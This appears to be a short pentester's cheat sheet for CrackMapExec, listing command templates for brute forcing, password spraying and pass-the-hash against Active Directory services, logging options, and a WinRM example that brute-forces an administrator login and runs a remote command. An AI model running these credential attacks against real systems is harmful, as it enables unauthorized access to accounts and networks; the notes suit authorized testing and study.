https://www.crackmapexec.wiki/
CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.
# Brute Forcing & Password Spraying
```bash
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords

# without bruteforce
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce 
	# user1 -> pass1
	# user2 -> pass2
```
`--continue-on-success` flag will continue spraying even after a valid password is found
## Pass-the-hash
```bash
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
```
# logi
* using the `cme.con`f file, this will log everything
	* `log_mode=True`
	* `cat ~/.cme/logs/full-log_....log`
* using the option `--log /tmp/my/filename.log` file , this will log only the current command
* both at the same time

# Modules
# ftp (T:21)
# ssh (T:22)
# ldap (T:389)
# smb (t:445)
# mssql (T:1433)
# rdp (t:3389)
# WinRM (T:5985/5986)
```bash
# Bruteforce 
$ crackmapexec winrm <IP> -u administrator -p /usr/share/wordlist/metasploit/common_passwords.txt
# logowanie jako u≈ºytkownik 
$ crackmapexec winrm <IP> -u administrator -p tinkerbel -x "whoami"
```

